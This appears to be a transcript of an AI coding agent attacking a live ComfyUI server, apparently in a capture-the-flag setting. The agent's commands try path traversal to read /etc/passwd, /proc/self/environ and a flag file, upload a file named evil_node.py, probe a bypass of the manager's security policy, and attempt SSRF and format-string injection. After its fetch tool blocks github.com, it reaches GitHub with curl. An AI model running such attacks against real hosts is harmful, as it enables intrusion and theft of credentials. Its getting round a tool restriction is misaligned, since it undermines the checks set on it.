+     === input/../../../../etc/ with filename=passwd ===
+     HTTP 403
+     … +5 lines (ctrl+o to expand)
+
+● Bash(# Let me be more precise about the subfolder traversal
+      # type=input -> base dir is /ComfyUI/input/…)
+  ⎿  HTTP/1.1 404 Not Found
+     Content-Length: 0
+     Date: Sat, 25 Apr 2026 08:20:50 GMT
+     … +7 lines (ctrl+o to expand)
+
+● Bash(# Let's find valid subfolder names by checking folder path endpoints
+      # Try the /experiment/models endpoint which listed directories…)  ⎿  checkpoints:
+       /ComfyUI/models/checkpoints
+       /ComfyUI/output/checkpoints
+     … +35 lines (ctrl+o to expand)
+
+● Bash(# Upload a file to create a known structure, then try directory
+      enumeration
+      # The LoadImageDataSetFromFolder node listed "3d" as a folder option…)
+  ⎿  HTTP 200 <- 3d/../
+     {
+       "name": "test2.txt",
+     … +7 lines (ctrl+o to expand)
+
+● 找到关键突破点！3d/ 是一个存在的目录，且 3d/../ 的路径穿越未被拦截！
+
+● Bash(# Path traversal confirmed working! Now read /etc/passwd
+      # Base: /ComfyUI/input/ + subfolder=3d/../../../../etc/ + filename=passwd
+      -> /etc/passwd…)
+  ⎿  === HTTP Status ===
+     HTTP 403
+
+● Bash(# The server might be checking that the resolved path stays within the
+      base directory
+      # Let me test by going one level up (to /ComfyUI/) and trying to read
+      some…)
+  ⎿  HTTP 403
+
+     === Trying with output type ===
+     … +6 lines (ctrl+o to expand)
+
+● Bash(# Check /api/view with path traversal
+      echo "=== /api/view ==="…)
+  ⎿  === /api/view ===
+     test content
+     … +41 lines (ctrl+o to expand)
+
+● Bash(# Try uploading with different 'type' values to write to different
+      directories
+      for type_val in "output" "temp" "custom_nodes" "customnode" "models"
+      "userdata" "…)
+  ⎿  type=output: {"name": "test_type.txt", "subfolder": "", "type": "outpu
+     t"}
+     type=temp: {"name": "test_type.txt", "subfolder": "", "type": "temp"}
+     … +20 lines (ctrl+o to expand)
+
+● Bash(# Let me check the policy endpoint more carefully
+      curl -s "http://222.20.126.52:32959/manager/policy/update" 2>&1…)
+  ⎿  low
+
+     workflow
+
+● Bash(# Let's check the channel_url_list to see what URLs the manager uses
+      curl -s "http://222.20.126.52:32959/manager/channel_url_list" 2>&1)
+  ⎿  {
+       "selected": "default",
+       "list": [
+     … +14 lines (ctrl+o to expand)
+
+● Bash(# Check the manager queue endpoints more carefully
+      curl -s "http://222.20.126.52:32959/manager/queue/update_all" 2>&1…)
+  ⎿  500 Internal Server Error
+
+     Server got itself in trouble=== update_comfyui ===
+     … +3 lines (ctrl+o to expand)
+
+● Bash(# Check which nodes might accept file paths
+      curl -s "http://222.20.126.52:32959/object_info" 2>&1 | python3 -c "…)
+  ⎿  (No output)
+
+● Bash(# Check if type=temp has different path traversal restrictions
+      curl -s "http://222.20.126.52:32959/view?filename=../etc/passwd&type=temp"
+       2>&1 | head -10…)
+  ⎿  -
+     HTTP 400
+     ---
+     … +5 lines (ctrl+o to expand)
+
+● Bash(# Try WebSocket subscription to logs (might leak info)
+      # Use curl to test WebSocket upgrade…)
+  ⎿  HTTP/1.1 404 Not Found
+     Transfer-Encoding: chunked
+     Content-Type: application/octet-stream
+     … +2 lines (ctrl+o to expand)
+
+● Bash(# Check /logs/raw endpoint
+      curl -s "http://222.20.126.52:32959/logs/raw" 2>&1 | head -50)
+  ⎿  (No output)
+
+● Bash(# Let's check the /files/input endpoint - this is a different pattern
+      curl -s "http://222.20.126.52:32959/files/input" 2>&1 | head -20…)
+  ⎿  ===
+
+● Bash(# Try to execute a workflow via /prompt that loads an image with path
+      traversal
+      # The LoadImage node accepts "image" as a STRING with image_upload…)  ⎿  {
+       "error": {
+         "type": "no_prompt",
+     … +6 lines (ctrl+o to expand)
+
+● Bash(# Try again with proper prompt wrapping
+      prompt='{…)
+  ⎿  {
+       "prompt_id": "5eac93e4-4ed8-4547-bf76-840f791259c5",
+       "number": 2,
+     … +2 lines (ctrl+o to expand)
+
+● Prompt 被接受执行了！让我检查结果。
+
+● Bash(curl -s "http://222.20.126.52:32959/queue" 2>&1)
+  ⎿  {
+       "queue_running": [],
+       "queue_pending": []
+     }
+
+● Bash(# Check if there's a history endpoint
+      curl -s "http://222.20.126.52:32959/manager/queue/history" 2>&1 | head
+      -50)
+  ⎿  (No output)
+
+● Bash(# Check if there's a /history endpoint
+      curl -s "http://222.20.126.52:32959/history" 2>&1 | head -50)
+  ⎿  {
+       "5eac93e4-4ed8-4547-bf76-840f791259c5": {
+         "prompt": [
+     … +46 lines (ctrl+o to expand)
+
+● Bash(# Check for the prompt execution result
+      curl -s "http://222.20.126.52:32959/manager/queue/status" 2>&1)
+  ⎿  {
+       "total_count": 1,
+       "done_count": 0,
+     … +3 lines (ctrl+o to expand)
+
+● Bash(# Try to create an empty image and execute it
+      # Let's first create a 1x1 black PNG and upload it, then use LoadImage
+      with a legitimate path…)
+  ⎿  PNG created
+     {
+       "name": "test.png",
+     … +3 lines (ctrl+o to expand)
+
+● 路径穿越成功！报错信息显示它能读取/ComfyUI/input/../../../../etc/passwd。现在
+  我需要找到一个能读取任意文本文件的节点。
+
+● Bash(# Check all nodes that might read text files
+      curl -s "http://222.20.126.52:32959/object_info" 2>&1 | python3 -c "…)
+  ⎿  CLIPTextEncode text=['STRING', {'multiline': True, 'dynamicPrompts': T
+     rue, 'tooltip': 'The text to be encoded.'}]
+     CLIPTextEncodeControlnet text=['STRING', {'multiline': True, 'dynamicP
+     … +15 lines (ctrl+o to expand)
+
+● Bash(# Check CheckpointLoaderSimple specification
+      curl -s "http://222.20.126.52:32959/object_info" 2>&1 | python3 -c "…)
+  ⎿  === CheckpointLoaderSimple ===
+     {
+       "input": {
+     … +46 lines (ctrl+o to expand)
+
+● Bash(# Try to read the ComfyUI-Manager source code to find security bypasses
+      # First, let me read the manager's main.py…)
+  ⎿  {
+       "error": {
+         "type": "prompt_no_outputs",
+     … +6 lines (ctrl+o to expand)
+
+● Bash(# Read ComfyUI-Manager source via LoadImage + SaveImage workflow
+      prompt='{"prompt":{"1":{"class_type":"LoadImage","inputs":{"image":"../cus
+      tom_nodes/ComfyUI-Man…)
+  ⎿  {
+       "prompt_id": "70f12893-1601-4cc8-b24d-3639e05c645a",
+       "number": 4,
+     … +2 lines (ctrl+o to expand)
+
+● Bash(# Check the history for errors
+      curl -s "http://222.20.126.52:32959/history" 2>&1 | python3 -c "…)
+  ⎿  Exception: cannot identify image file '/ComfyUI/input/../../../../etc/
+     passwd'
+     … +5 lines (ctrl+o to expand)
+
+● Bash(# Can I upload to an arbitrary path using the subfolder parameter?
+      echo "test symlink" > /tmp/symtest.txt…)
+  ⎿  (No output)
+
+● Bash(# What if I use overtype parameter to change the save location?
+      curl -s "http://222.20.126.52:32959/api/upload/image" -X POST -F
+      "image=@/tmp/symtest.txt;filena…)
+  ⎿  500 Internal Server Error
+
+     Server got itself in trouble
+
+● Bash(# List files in the /input directory using the object_info for LoadImage
+      # Let me check if LoadImage lists files in its error output…)  ⎿  Trying /ComfyUI/web/favicon.ico:
+     Trying /ComfyUI/web/logo.png:
+     Trying /ComfyUI/web/icon.png:
+
+● Bash(# Let me check if there's a /flag on the filesystem by trying to read it
+      via Python
+      # through a workflow. Let me first check what node types have Python
+      execut…)
+  ⎿  AudioEncoderEncode
+     AudioEncoderLoader
+     CLIPTextEncode
+     … +37 lines (ctrl+o to expand)
+
+● Bash(# Check if SaveImage can write outside the output directory
+      # Use LoadImage with a valid PNG + SaveImage with path traversal in
+      filename_prefix…)
+  ⎿  {
+       "prompt_id": "740c5935-d9f7-4f4d-b35e-c8d4412c6fd1",
+       "number": 8,
+     … +2 lines (ctrl+o to expand)
+
+● Bash(sleep 1
+      curl -s "http://222.20.126.52:32959/history" 2>&1 | python3 -c "…)
+  ⎿  PID: 5eac93e4-4ed8-4547-bf76-840f791259c5, Status: error
+       execution_start: {"prompt_id": "5eac93e4-4ed8-4547-bf76-840f791259c5
+     ", "timestamp": 1777105354112}
+     … +19 lines (ctrl+o to expand)
+
+● Bash(# Check SaveImageWebsocket and PreviewImage nodes
+      curl -s "http://222.20.126.52:32959/object_info" 2>&1 | python3 -c "…)
+  ⎿  === SaveImageWebsocket ===
+     {
+       "input": {
+     … +49 lines (ctrl+o to expand)
+
+● Bash(# Let me check if there's a way to read files through the websocket
+      # First, let me try to execute a workflow that sends data via websocket…)
+  ⎿  {
+       "prompt_id": "60caaaae-7506-45ef-90e8-d6a4b061adbf",
+       "number": 9,
+     … +2 lines (ctrl+o to expand)
+
+● Bash(# Check the security policy bypass more carefully
+      echo "Current policy:"…)
+  ⎿  Current policy:
+     workflow
+     Try setting to normal:
+     … +29 lines (ctrl+o to expand)
+
+● Bash(# Let me check if upload has path traversal too
+      # Upload a file with subfolder=3d/../../../tmp/…)
+  ⎿  (No output)
+
+● Bash(# Let me also check if the checkpoints output folder has files we can
+      read
+      curl -s "http://222.20.126.52:32959/view?filename=test.png&type=output"
+      2>&1 | head -…)
+  ⎿  ---
+     ---
+     checkpoints: ['/ComfyUI/models/checkpoints', '/ComfyUI/output/checkpoi
+     … +17 lines (ctrl+o to expand)
+
+● Bash(# Let me look at this from a CTF perspective. Let me check if there's a
+      flag in common locations
+      # by trying to read it via LoadImage and seeing detailed error…)
+  ⎿  {"error": {"type": "prompt_outputs_failed_validation", "message": "Pro
+     mpt outputs failed validation", "details": "", "extra_info": {}}, "nod
+     e_errors": {"1": {"errors": [{"type": "custom_validation_failed", "mes
+     … +9 lines (ctrl+o to expand)
+
+● Bash(# The validation requires image extensions. Let me try with .png appended
+      prompt='{"prompt":{"1":{"class_type":"LoadImage","inputs":{"image":"../../
+      ../flag.png"…)
+  ⎿  {
+       "error": {
+         "type": "prompt_outputs_failed_validation",
+     … +31 lines (ctrl+o to expand)
+
+● Bash(# Let me try reading flag files at various locations
+      # The validation accepts ../ patterns that lead to existing files…)
+  ⎿  ../flag -> VALIDATION FAILED: image - Invalid image file: ../flag
+     ../../flag -> VALIDATION FAILED: image - Invalid image file: ../../fla
+     g
+     … +18 lines (ctrl+o to expand)
+
+● Bash(# Good! /flag.txt exists on the server!
+      # Now I need to read its content. Let me try another approach.…)
+  ⎿  Try 1: Upload to input with subfolder traversal
+     {
+       "name": "evil_node.py",
+     … +9 lines (ctrl+o to expand)
+
+● Bash(# Let me check what files exist in the ComfyUI user directory
+      # Try reading the user settings/config file…)
+  ⎿  === ../user/default/comfyui-settings.json ===
+       Result: prompt_outputs_failed_validation
+       -> File doesn't exist
+     … +22 lines (ctrl+o to expand)
+● Web Search("ComfyUI 0.9.2 path traversal vulnerability CVE exploit CTF")
+  ⎿  Did 0 searches in 3s
+
+● Web Search("ComfyUI vulnerability read arbitrary files CVE github")
+  ⎿  Did 0 searches in 3s
+
+● Fetch(https://github.com/comfyanonymous/ComfyUI/security/advisories)
+  ⎿  Error: Unable to verify if domain github.com is safe to fetch. This may be 
+     due to network restrictions or enterprise security policies blocking 
+     claude.ai.
+
+● Bash(# Try the model installation with SSRF. Let me look at how the manager
+      downloads models.
+      # First, let me look at the JS for more details on install_model…)
+  ⎿                             });
+                        }
+     … +37 lines (ctrl+o to expand)
+
+● Bash(# Fetch the model database from the ComfyUI-Manager channel URL
+      curl -s "https://raw.githubusercontent.com/ltdrdata/ComfyUI-Manager/main/m
+      odel_list.json" 2>&1 |…)
+  ⎿  404: Not Found
+
+● Bash(# Find how models are fetched
+      curl -s
+      "http://222.20.126.52:32959/extensions/ComfyUI-Manager/model-manager.js"
+      2>&1 | grep -i "fetch\|url\|load\|model_list\|cha…)
+  ⎿     fetchData, md5, icons, show_message, customAlert, infoToast,
+     showTermi
+     nal,
+        storeColumnWidth, restoreColumnWidth, loadCss
+     … +17 lines (ctrl+o to expand)
+
+● Bash(# Try the externalmodel/getlist endpoint
+      curl -s "http://222.20.126.52:32959/externalmodel/getlist" 2>&1 | head
+      -200)
+  ⎿  500 Internal Server Error
+
+     Server got itself in trouble
+
+● Bash(# Look for how install_model works and what parameters it needs
+      curl -s
+      "http://222.20.126.52:32959/extensions/ComfyUI-Manager/model-manager.js"
+      2>&1 | grep -B…)
+  ⎿             await api.fetchApi('/manager/queue/reset');
+                let target_items = [];
+                for (const item of list) {
+     … +10 lines (ctrl+o to expand)
+
+● Bash(# Try install_model with proper model data structure
+      curl -s -i "http://222.20.126.52:32959/manager/queue/install_model" -X
+      POST \…)
+  ⎿  HTTP/1.1 500 Internal Server Error
+     Content-Type: text/plain; charset=utf-8
+     Content-Length: 55
+     … +7 lines (ctrl+o to expand)
+
+● Bash(# Check what nodes can work without any model (no MODEL/CLIP/VAE input)
+      curl -s "http://222.20.126.52:32959/object_info" 2>&1 | python3 -c "…)
+  ⎿  AddTextPrefix: inputs=['texts', 'prefix'] -> outputs=['texts']
+     AddTextSuffix: inputs=['texts', 'suffix'] -> outputs=['texts']
+     AlignYourStepsScheduler: inputs=['model_type', 'steps', 'denoise'] ->
+     … +56 lines (ctrl+o to expand)
+
+● Bash(# Check GeminiInputFiles and OpenAIInputFiles full specs
+      curl -s "http://222.20.126.52:32959/object_info" 2>&1 | python3 -c "…)
+  ⎿  === GeminiInputFiles ===
+     {
+       "input": {
+     … +36 lines (ctrl+o to expand)
+
+● Bash(# Look for text-outputting nodes
+      curl -s "http://222.20.126.52:32959/object_info" 2>&1 | python3 -c "…)
+  ⎿  CaseConverter: inputs=['string', 'mode'], outputs=['STRING']
+     CustomCombo: inputs=['choice'], outputs=['STRING']
+     GeminiImage2Node: inputs=['prompt', 'model', 'seed', 'aspect_ratio', '
+     … +13 lines (ctrl+o to expand)
+
+● Bash(# Try to use GeminiInputFiles with path traversal in the file parameter
+      # Even though the COMBO has predefined options, the backend might accept
+      any value…)
+  ⎿  {
+       "error": {
+         "type": "prompt_no_outputs",
+     … +16 lines (ctrl+o to expand)
+
+● Bash(# Let me try the PrimitiveString node and see if I can get its output
+      somehow
+      # Connect PrimitiveString -> CaseConverter -> some output…)
+  ⎿  {
+       "error": {
+         "type": "prompt_no_outputs",
+     … +16 lines (ctrl+o to expand)
+● Bash(# Find nodes that accept STRING input and have output_node: true
+      curl -s "http://222.20.126.52:32959/object_info" 2>&1 | python3 -c "…)
+  ⎿  CLIPSave.filename_prefix
+     CheckpointSave.filename_prefix
+     ImageOnlyCheckpointSave.filename_prefix
+     … +25 lines (ctrl+o to expand)
+
+● Bash(# Search for any node related to text loading
+      curl -s "http://222.20.126.52:32959/object_info" 2>&1 | python3 -c "…)
+  ⎿  ---
+     CLIPSave.clip: CLIP
+     CLIPSave.filename_prefix: STRING
+     … +59 lines (ctrl+o to expand)
+
+● Bash(# Try using PreviewAny with a string source
+      # Connect PrimitiveString -> PreviewAny…)
+  ⎿  {
+       "prompt_id": "72bd6960-4b21-4511-80ec-0d72d718e5db",
+       "number": 25,
+     … +23 lines (ctrl+o to expand)
+
+● Bash(# Try GeminiInputFiles with path traversal and GeminiNode to read the
+      file
+      # Even if the Gemini API fails, the input file reading might happen
+      first…)
+  ⎿  {
+       "error": {
+         "type": "prompt_outputs_failed_validation",
+     … +28 lines (ctrl+o to expand)
+
+● Bash(# Try GeminiInputFiles with correct model name
+      prompt='{…)
+  ⎿  {
+       "prompt_id": "dd0861f4-14f0-40e3-9620-982a0cbf7c29",
+       "number": 27,
+     … +21 lines (ctrl+o to expand)
+
+● Bash(# Check the specific prompt
+      curl -s
+      "http://222.20.126.52:32959/history/dd0861f4-14f0-40e3-9620-982a0cbf7c29"
+      2>&1 | python3 -c "…)
+  ⎿  No result yet
+
+● Bash(sleep 2
+      curl -s "http://222.20.126.52:32959/history" 2>&1 | python3 -c "…)
+  ⎿  PID 60caaaae-7506-45ef-90e8-d6a4b061adbf: status=success
+       execution_cached: {'nodes': ['1'], 'prompt_id': '60caaaae-7506-45ef-
+     90e8-d6a4b061adbf', 'timestamp': 1777105474638}
+     … +23 lines (ctrl+o to expand)
+
+● Bash(# Let me explore the userdata endpoint more carefully
+      # Try different userdata paths…)
+  ⎿  /api/userdata: HTTP 400
+     /api/userdata/: HTTP 404
+     /api/userdata/default: HTTP 404
+     … +7 lines (ctrl+o to expand)
+
+● Bash(# Check if the flag is in environment variables via /system_stats
+      # Also check /proc/self/environ via LoadImage…)
+  ⎿  {
+         "system": {
+             "os": "linux",
+     … +27 lines (ctrl+o to expand)
+
+● Bash(# Check CustomCombo node - it might have interesting behavior
+      curl -s "http://222.20.126.52:32959/object_info" 2>&1 | python3 -c "…)
+  ⎿  {
+       "input": {
+         "required": {
+     … +38 lines (ctrl+o to expand)
+
+● Bash(# List ALL custom node categories/modules
+      curl -s "http://222.20.126.52:32959/object_info" 2>&1 | python3 -c "…)
+  ⎿  comfy_api_nodes.nodes_bfl
+     comfy_api_nodes.nodes_bytedance
+     comfy_api_nodes.nodes_gemini
+     … +41 lines (ctrl+o to expand)
+
+● Bash(# Let me try a creative approach: Use the SaveImage node to save to the
+      input directory
+      # then read the file back via /view…)
+  ⎿  {
+       "prompt_id": "963d8a3b-a9b9-4911-be75-fd93ff5b600b",
+       "number": 28,
+     … +2 lines (ctrl+o to expand)
+
+● Bash(sleep 1
+      curl -s "http://222.20.126.52:32959/history" 2>&1 | python3 -c "…)
+  ⎿  PID 740c5935-d9f7-4f4d-b35e-c8d4412c6fd1: status=error
+       execution_error: {"prompt_id": "740c5935-d9f7-4f4d-b35e-c8d4412c6fd1
+     ", "node_id": "2", "node_type": "SaveImage", "executed": ["1"], "excep
+     … +22 lines (ctrl+o to expand)
+● Bash(# Check the string module nodes
+      curl -s "http://222.20.126.52:32959/object_info" 2>&1 | python3 -c "…)
+  ⎿  CaseConverter
+       inputs: {
+         "required": {
+     … +49 lines (ctrl+o to expand)
+
+● Bash(# Check nodes_logic module
+      curl -s "http://222.20.126.52:32959/object_info" 2>&1 | python3 -c "…)
+  ⎿  ComfySwitchNode
+       inputs: {
+         "required": {
+     … +46 lines (ctrl+o to expand)
+
+● Bash(# Try format string injection in SaveImage filename_prefix
+      prompt='{"prompt":{"1":{"class_type":"LoadImage","inputs":{"image":"test.p
+      ng"}},"2":{"class_type":"Sa…)
+  ⎿  {"prompt_id": "ca96f571-3a98-459d-8ae6-13a9998e89ad", "number": 29, "n
+     ode_errors": {}}=== History ===
+     outputs: {
+     … +19 lines (ctrl+o to expand)
+
+● Bash(# Try different HTTP methods on the customnode install endpoint
+      for method in "GET" "POST" "PUT" "PATCH" "DELETE" "OPTIONS" "HEAD"; do…)
+  ⎿  Running in the background (↓ to manage)
+
+● Bash(# Let me try the OPTIONS method
+      curl -s -v -X OPTIONS
+      "http://222.20.126.52:32959/customnode/install/git_url" 2>&1 | grep -i
+      "allow\|HTTP"…)
+  ⎿  > OPTIONS /customnode/install/git_url HTTP/1.1
+     < HTTP/1.1 200 OK
+     < Server: Python/3.13 aiohttp/3.13.3
+     … +5 lines (ctrl+o to expand)
+
+● Bash(# Explore /experiment/ endpoints
+      for path in "experiment" "experiment/" "experiment/flag"
+      "experiment/flag.txt" "experiment/models" "experiment/test"; do…)
+  ⎿  /experiment: HTTP 404
+     /experiment/: HTTP 404
+     /experiment/flag: HTTP 404
+     … +3 lines (ctrl+o to expand)
+
+● Bash(# Let me check what's in the custom_nodes directory
+      # by listing files through various endpoints…)
+  ⎿  /extensions/core/groupNode.js
+     /extensions/core/widgetInputs.js
+     /extensions/core/groupNodeManage.js
+     … +17 lines (ctrl+o to expand)
+
+● Bash(# Let me check how files are served. The upload returned type=input
+      # The /view endpoint with type=input reads from /ComfyUI/input/…)
+  ⎿  /input/test.png: HTTP 404
+     /uploads/test.png: HTTP 404
+     /input/testread.txt: HTTP 404
+     … +6 lines (ctrl+o to expand)
+
+● Bash(# Let me try using the LoadImage node to read /proc/self/environ
+      # Even though PIL will fail, the error might contain useful info…)
+  ⎿  {"prompt_id": "4bae7eae-d1c6-4695-a17d-bd212ad2c974", "number": 30, "n
+     ode_errors": {}}=== History ===
+     Exception: Unauthorized: Please login first to use this node.
+
+● Bash(# Check the environ read error
+      curl -s "http://222.20.126.52:32959/history" 2>&1 | python3 -c "…)
+  ⎿  PID: dd0861f4-14f0-40e3-9620-982a0cbf7c29
+     Exception: Unauthorized: Please login first to use this node.
+
+     Inputs: {}
+
+● Bash(# Check all PIDs
+      curl -s "http://222.20.126.52:32959/history" 2>&1 | python3 -c "…)
+  ⎿  Total: 10
+       2544fb12-7ef9-4789-925e-b891360688a9: ERROR - cannot identify image
+     file '/ComfyUI/input/../../flag.txt'
+     … +17 lines (ctrl+o to expand)
+
+● Bash(# Let me check all nodes from comfy_extras that aren't already listed
+      # Maybe there's a node that reads text files…)
+  ⎿  CLIPSave.filename_prefix: STRING
+     CheckpointSave.filename_prefix: STRING
+     ImageOnlyCheckpointSave.filename_prefix: STRING
+     … +18 lines (ctrl+o to expand)
+  ⎿  Interrupted · What should Claude do instead?
